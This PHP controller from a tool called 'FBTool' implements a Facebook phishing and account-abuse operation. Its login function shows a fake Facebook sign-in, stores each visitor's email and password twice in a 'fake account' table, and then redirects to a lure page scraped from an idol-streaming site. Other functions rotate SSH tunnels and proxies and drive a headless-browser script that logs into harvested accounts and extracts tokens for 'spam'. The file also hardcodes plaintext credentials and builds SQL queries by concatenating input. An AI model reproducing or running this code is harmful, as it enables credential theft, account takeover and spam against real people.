<?php

/*
 * Copyright 2016 tupt.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

class FacebookController extends FBToolController {

    protected $table = 'tbl_ssh_thuan';

    function __construct() {
        parent::__construct();
        global $argv;
        if (!isset($argv)) {
            $ip_address = $this->get_client_ip();
            $agent = trim($_SERVER['HTTP_USER_AGENT']);
            $test = db_select_one('tbl_facebook_account_fake', 'check', array('ip' => $ip_address, 'agent' => $agent), true);
            $is_mobile = preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|palm|phone|iphone|pie|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
            $this->assign('isLogged', $test ? 'true' : 'false', 'is_mobile', $is_mobile);
        }
    }

    function download() {
        $json = json_decode(file_get_contents(PROCESS_PATH . "data/json/starListbyId.json"), true);
        $site_path = THEME_PATH . 'fbtool/facebook';
        foreach ($json as &$v) {
            $remote_url = 'http://idoltv.vn' . $v['snap'];
            $local = $site_path . $v['snap'];
            $local_path = pathinfo($local, PATHINFO_DIRNAME);
            $v['snap'] = 'themes/fbtool/facebook' . $v['snap'];
            if (!file_exists($local_path)) {
                mkdir($local_path, 0777, true);
            }

            file_put_contents($local, file_get_contents($remote_url));
            echo "DOWNLOADED : from $remote_url to $local\n";
        }

        file_put_contents(PROCESS_PATH . "data/json/starListbyId.json", json_encode($json));
    }

    function append() {
        $youtube_id = ["-AemS6xL1BY", "Ran0JMHjfao", "Puz_Fs3Rgng", "RjXQGAMF0Vs", "EKG8phqX7PA", "jRJAgqs31qU", "2yQCmkCrr_w", "LNR-rmTH6O0", "nAUI9u750mo", "gj0I7W2h7uk", "mOCpF4tWHAo", "A0OKIA4f2LU", "Lh4YfA_D_gs", "Qmt-HxF1Zvs", "vrm-Nq9o2F4", "UGySs7HyZxM", "lWDuxZ2atF4", "qN8HJT77h3w", "31AKju66KTE", "6_RnhJ-eB3c", "8dh3adMm1OQ", "W-9jAqA50uo", "6ipny0MR9rk", "ZWLM6iaeVR0", "1-J_FhyNCGY", "PlcImpBQEOM", "Esu5VQwz3G4", "rgcFnyEOmFY", "5gJcdRnsUWQ", "jiMjE0sMh8U", "FSMByGJXpyo", "L0RPrcEIpto", "dkTmguno-1A", "Ji7a4skMwss", "jfbcKa7yvg4", "f36yc5vJNCg", "EEwK-oRhAC4", "2edLeMbUL1U", "PeuFcXdWEv4", "MlgJ8hhqCrk", "OZ0xq6je4a4", "Ye0MCbqeQbE", "z7CziWMcZp4", "a97FMZPGD04", "yCNxIDnoLrg", "hDvo3XHWJi0", "ke_UGj9bfaY", "dxc7rL3cOyA", "X9mqf2DBr8c", "NCs-MI0ypQg", "6wESc4WDZNc", "U9jXD4CVAHs", "QxUOdXBXKMg", "HDP7cAn0aw4", "bfLog6aHyv8", "tvwsyKFM5Mk", "1h4j3r04ISY", "UymroOWy6C4", "fy73d6bNxS0", "7EFzCzWnMQk", "UFhxB-FkmK8", "EP7PMFKAbqM", "msA8KbtX8hw", "-RGGGGx-7T4", "roQbF6Cnlwc", "QW28wSFl7Yc", "vjWBRdRJCn8", "b0qvU1aBexQ", "BwDfFKs766Y", "zRIV1ud_bi0", "N6UrxQgSW1c", "ic3iiJ09WWw", "6vxECeCL9LQ", "eb_FdXALZKU", "quShLelXcJ4", "sEReSKsbcqY", "RXiRnLRcQ60", "blM_j-dUNgc", "kJiMcnb5O4Y", "IrothOPQJKg", "O_xvj2kH-n8", "qdbk9vrcMFk", "sVocNGcoTzo", "FycCyEoff6I", "ER_SsM4rpXA", "BXBb5bE2gRE", "PkMOzChnbOY", "SteNSAIL3D4", "YdlxaSqUkJY", "ctmThPYcl90", "xfBQ3YJiK5M", "MpA-uSfDVkU", "c0wSrB4zKxc", "9lNRJOSKjSQ", "8q-ldAMOGYU", "4wRqI4rX1sk", "Co5B3KCk9t8", "qANIYFHuQ4k", "vjRFxMQ1I10", "z0CJ2154WSs", "nje5Tyb2JcU", "5qPdDyXF_o4", "9T9Sv71HAZk", "SPzSFMAlRU8", "MOCCxcedwUM", "pxOWF-guAoI", "eWgleuzWpeo", "_3jnO9QsxYA", "e9u98TAR4WQ", "9cIpD7_lHZk", "DCg02u905pk", "juyxWyZZK2M", "DTsD-r0N3AY", "8K8ypPzoEMA", "yHlxmjwqfpk", "4MLVdt2o8GE", "7xVsmOrJqkk", "vvTIDCDs9TY", "P5I3Dkbrw6o", "ptWnho66gJg"];
        $json = json_decode(file_get_contents(PROCESS_PATH . "data/json/starListbyId.json"), true);
        $ind = 0;
        foreach ($json as &$v) {
            $v['yid'] = $youtube_id[$ind];
            $ind++;
        }
        file_put_contents(PROCESS_PATH . "data/json/starListbyId.json", json_encode($json));
    }

    function index() {
//        $url = 'http://idoltv.vn/';
//        include APP_PATH . 'lib/plugins/class.curlCrawler.php';
//        $curl_crawler = new CURLCrawler();
//        $resp = $curl_crawler->get('http://idoltv.vn/21667105');
//        $ret = $resp['content'];
//        $ret = preg_replace('#<head>#i', '<head><base href="' . $url . '">', $ret);
//        $ret = str_replace('/Public/idol/css/bootstrap.min.css', SITE_ROOT . 'themes/fbtool/css/bootstrap.min.css', $ret);
//        $ret = preg_replace('#<iframe\s+id\s*=\s*"popupFrameItemReward"(.*?)</iframe>#', '', $ret);
//        $ret = str_replace('/index.php/Show/show_adv', SITE_ROOT . 'facebook/fake', $ret);
//        $ret = str_replace('var width = 600;', 'var width=1160;', $ret);
//        $ret = str_replace('var height = 600;', 'var height=730;', $ret);
//        $ret = str_replace('var topOffset = (((windowHeight - height) / 2) * 100) / windowHeight;','var topOffset = 10;',$ret);
//
//        $ret = preg_replace('#<body>#i', '<body><div id="backdrop" style="position: fixed;width: 100%;height: 100%;background: rgba(0,0,0,0.7);z-index: 100;top: 0;left: 0;right: 0;bottom: 0;"></div>', $ret);
//        echo $ret;
//        $_SESSION['login_attempt'] = 0;
//        $idol_tv = ["26435269", "12871412", "37646029", "15794724", "37765674", "24227460", "17379445", "36237185", "35882522", "27685474", "26038502", "21667105", "28770869", "35013626", "10573698", "22011207", "26398974", "34647384", "14772488", "31424455", "35777538", "27086667", "32376236", "33818638", "28325441", "21994202", "17432085", "14740323", "39953101", "35084176", "26710653", "11784713", "34818099", "25990513", "15579191", "17843922", "30789444", "10873646", "20358964", "31126842", "36340977", "22345309", "25163380", "39125099", "23286228", "21546094", "15728262", "12410229", "19688168", "23067413", "31104456", "31199730", "20086352", "25722077", "19649477", "22524652", "15376036", "31514698", "36560151", "18059089", "23958957", "31342948", "19336139", "26590263", "39407570", "11214566", "23431912", "18335699", "31231627", "25297527", "32580139", "19589918", "31984003", "13215046", "13724902", "27128655", "37805611", "16382494", "21182428", "17163512", "28773231", "15392987", "15923694", "19660045", "25469906", "32682734", "25125220", "25083790", "34282951", "35877601", "10049320", "37087573", "25655071", "28900942", "28527393", "23957917", "23159762", "20477254", "11995359", "14512632"];
//        $idol_id = $idol_tv[array_rand($idol_tv)];
//        $this->assign('idol_id', $idol_id);
        $this->load('facebook');
    }

    function ajax($file) {
        echo file_get_contents(PROCESS_PATH . "data/json/$file.json");
    }

    private function get_client_ip() {
        $ipaddress = '';
        if (getenv('HTTP_CLIENT_IP'))
            $ipaddress = getenv('HTTP_CLIENT_IP');
        else if (getenv('HTTP_X_FORWARDED_FOR'))
            $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
        else if (getenv('HTTP_X_FORWARDED'))
            $ipaddress = getenv('HTTP_X_FORWARDED');
        else if (getenv('HTTP_FORWARDED_FOR'))
            $ipaddress = getenv('HTTP_FORWARDED_FOR');
        else if (getenv('HTTP_FORWARDED'))
            $ipaddress = getenv('HTTP_FORWARDED');
        else if (getenv('REMOTE_ADDR'))
            $ipaddress = getenv('REMOTE_ADDR');
        else
            $ipaddress = 'UNKNOWN';
        return ip2long($ipaddress);
    }
    
    function part($ind=1){        
        $this->load(false,'part/part'.$ind);
    }

    function login() {

        if ($this->args['isLogged'] == 'true' && !isset($_GET['anonymous'])) {
            $this->redirect('facebook/index');
        }       

        if ($this->is_postback()) {
            $agent = trim($_SERVER['HTTP_USER_AGENT']);
            $this->assign('is_postback', true);
            $ip_address = $this->get_client_ip();
            $test = db_select_one('tbl_facebook_account_fake', array('id', 'check'), array('ip' => $ip_address, 'agent' => $agent));

            if (!$test) {
                // the first time insert into database
                db_insert('tbl_facebook_account_fake', array(
                    'ip' => $ip_address,
                    'agent' => $agent,
                    'user' => trim($_POST['email']),
                    'pass' => trim($_POST['pass']),
                    'check' => 0
                ));
            } else {
                if (!$test['check']) {
                    // the second time, update then break
                    db_update('tbl_facebook_account_fake', array(
                        'user2' => trim($_POST['email']),
                        'pass2' => trim($_POST['pass']),
                        'check' => 1
                            ), array(
                        'id' => $test['id']
                    ));

                    $this->redirect('facebook/index');
                }
            }
//      
        }
        
        

        $this->load(false, 'login');
    }

    function fake_show() {
        $this->json($_GET);
    }

    function facebook($user, $pass, $agent, $port = false) {
        $ret = null;
        if ($user && $pass) {
            global $argh;

            $profile_path = PROCESS_PATH . 'scripts/profiles/facebook';
            $proxy = $port ? "--proxy=127.0.0.1:$port --proxy-type=socks5" : "";
            $agent_str = "--agent='$agent'";
            $login = "--username='$user' --password='$pass'";
            if (isset($argh['--engine'])) {
                $cookie = "-profile '$profile_path/$user'";
                // this profile created by init profile(agent, firefox profile, user and pass)
            } else {
                $cookie = "--cookies-file=" . PROCESS_PATH . "scripts/cookies/facebook/$user.txt";
            }
            $script = PROCESS_PATH . 'scripts/facebook_token.js';

            $cmd = $this->casper();
            if (isset($argh['--msg'])) {
                $cmd .= " --msg='" . $argh['--msg'] . "'";
            }
            $cmd .= " --disk-cache=true --width=1224 --height=800 $script $login $cookie $proxy $agent_str";

            $ret = $this->get_json_response($cmd, true);
        }
        return $ret;
    }

    function test_facebook() {

        $user = 'pegory973@gmail.com';
        $pass = 'ppooiiuu';

        $agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36';

        $ret = $this->facebook($user, $pass, $agent);
        print_r($ret);
    }

    function get_next_ssh($ip_list, &$ind, $timeout = 10000, $port = 1111) {

        while (true) {
            $item = $ip_list[$ind++];
            if ($ind == count($ip_list)) {
                $ind = 0;
            }
            echo "\nChecking ... ";
            print_r($item);
            if ($item) {
                if ($this->change_server($item['ip'], $item['user'], $item['pass'], $port)) {

                    // has run, then next, no need, url can be repeated, because we have checked existed
//                    if (!$this->check_run($item['ip'], $url)) {
//                        continue;
//                    }

                    sleep(0.5);

                    if ($this->check_port($port, $timeout)) {
                        // random information
//                        list($mobile_width, $mobile_height) = explode('|', $viewports[array_rand($viewports)]);
//                        list($width, $height) = explode('|', $desk_viewports[array_rand($desk_viewports)]);
//                        $mobile_agent_str = $mobile_agents[array_rand($mobile_agents)];
//                        $agent_str = $agents[array_rand($agents)];
//                    $url = $urls[array_rand($urls)];

                        echo "This ip " . $item['ip'] . " is okay\n";

                        return true;
                    }
                }
            } else {
                break;
            }
        }

        return false;
    }

    function get_next_ssh_by_country($country_code, $timeout = 10000, $port = 1111) {

        $item = db_query_one("SELECT * FROM `" . $this->table . "` WHERE country_code = '$country_code' order by rand() limit 1");
        if ($item) {
            $country_code = 'US'; // default
            $item = db_query_one("SELECT * FROM `" . $this->table . "` WHERE country_code = '$country_code' order by rand() limit 1");
        }

        while (true) {

            echo "\nChecking ... ";

            if ($item) {
                if ($this->change_server($item['ip'], $item['user'], $item['pass'], $port)) {

                    // has run, then next, no need, url can be repeated, because we have checked existed
//                    if (!$this->check_run($item['ip'], $url)) {
//                        continue;
//                    }

                    sleep(0.5);

                    if ($this->check_port($port, $timeout)) {
                        // random information
//                        list($mobile_width, $mobile_height) = explode('|', $viewports[array_rand($viewports)]);
//                        list($width, $height) = explode('|', $desk_viewports[array_rand($desk_viewports)]);
//                        $mobile_agent_str = $mobile_agents[array_rand($mobile_agents)];
//                        $agent_str = $agents[array_rand($agents)];
//                    $url = $urls[array_rand($urls)];

                        echo "This ip " . $item['ip'] . " is okay\n";

                        return true;
                    }

                    $item = db_query_one("SELECT * FROM `" . $this->table . "` WHERE country_code = '$country_code' order by rand() limit 1");
                }
            } else {
                break;
            }
        }

        return false;
    }

    function spam_facebook($port, $start, $stop, $ctr = 10, $remove_ip = 1, $mobile_rate = 3, $timeout = 10000) {

        // get file to run for this instance
        $ind_file = +$port - 1110;
        $lines = file(PROCESS_PATH . "scripts/spam_facebook/$ind_file.txt");
        // each instance has a range of ip, then run a file of facebook acc list
        $where = array("id > $start", "id <= $stop");
        global $argh;
//  
        $ip_list = isset($argh['--ssh-country']) ? null : db_select($this->table, array('ip', 'user', 'pass'), $where, false, 0, 'id ASC');

        // to get ssh by circle
        $ind_list = 0;

        foreach ($lines as $line) {
//            $user = 'skippershe@sbcglobal.net';
//            $pass = 'marios';            
//            $agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36';
            @list($user, $pass, $agent) = explode('|', $line);
            $user = trim($user);
            $pass = trim($pass);
            $agent = trim($agent);

            // update info
            $agent_str = "--agent='$agent'";
            $login = "--username='$user' --password='$pass'";
            $cookie = ""; // "--cookies-file=" . PROCESS_PATH . "scripts/cookies/$user.txt";
            $script = PROCESS_PATH . 'scripts/facebook.js';
            $test = isset($argh['--ssh-country']) ? $this->get_next_ssh_by_country($argh['--ssh-country'], $timeout, $port) : $this->get_next_ssh($ip_list, $ind_list, $timeout, $port);

            // if ok
            if ($test) {

                $ret = $this->facebook($user, $pass, $agent, $port);
                print_r($ret);
            }

            // update processing = 1;
            $this->close_port($port);


            // sleep 1 second
            sleep(1);
        }
    }

    function get_json_response($cmd, $raw = false) {

        $ret = array();
        exec($cmd, $ret);
        if (!$raw) {
            if ($ret) {

                foreach ($ret as $row) {

                    // check exit or maximun step timeout
                    $ret_str = strtolower(substr(trim($row), 0, 6));
                    // check exit or maximun step timeout, Unsafe javascript ?, Exiting @@                
                    if ($ret_str === 'exitin' || $ret_str === 'maximu' || $ret_str === 'unsafe') {
                        return false;
                    }

                    if ($row[0] == '{') {
                        return $row;
                    }
                }

                return $ret[0];
            }

            return $ret[0];
        } else {
            return $ret;
        }
    }

    function prepare_process_facebook($instance_number) {
        $data = db_select('tbl_facebook_account', array('user', 'pass', 'agent'));
        $size = ceil(count($data) / $instance_number);
        $parts = array_chunk($data, $size);

        $ind_file = 0;
        foreach ($parts as $part) {
            $ind_file++;
            $lines = [];
            foreach ($part as $v) {
                $lines[] = $v['user'] . '|' . $v['pass'] . '|' . $v['agent'];
            }
            file_put_contents(PROCESS_PATH . "scripts/spam_facebook/$ind_file.txt", implode(PHP_EOL, $lines));
        }
    }

    function update_facebook($file) {
        // save to amazon
        $lines = file(PROCESS_PATH . "scripts/$file.txt");
        $agents = file(PROCESS_PATH . 'scripts/agent.txt');

        foreach ($lines as &$line) {
            @list($user, $pass) = explode('|', $line);
            $user = trim($user);
            $pass = trim($pass);
            $agent = trim($agents[array_rand($agents)]);
            $id = db_select_one('tbl_facebook_account', 'id', array('user' => $user), true);
            if (!$id) {
                $data = compact('user', 'pass', 'agent');
                db_insert('tbl_facebook_account', $data);
            }
        }
    }

}
